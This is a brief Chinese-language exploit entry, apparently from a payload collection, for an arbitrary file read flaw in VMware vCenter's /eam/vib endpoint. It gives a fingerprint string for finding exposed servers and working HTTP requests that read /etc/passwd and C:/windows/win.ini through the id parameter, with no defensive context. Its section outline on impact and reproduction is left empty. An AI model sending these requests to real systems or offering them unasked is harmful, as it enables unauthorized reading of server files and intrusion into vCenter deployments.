# VMwarevCentervib存在任意文件读取漏洞

- **系统**：VMwarevCentervib　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="ID_VC_Welcome"`
- **请求**：`GET /eam/vib?id=/etc/passwd HTTP/1.1`

**请求体 / payload**
```
GET /eam/vib?id=C:/windows/win.ini HTTP/1.1
Host:
Sec-Fetch-User: ?1
```

**其他**
- VMware vCenter vib存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * VMware vCenter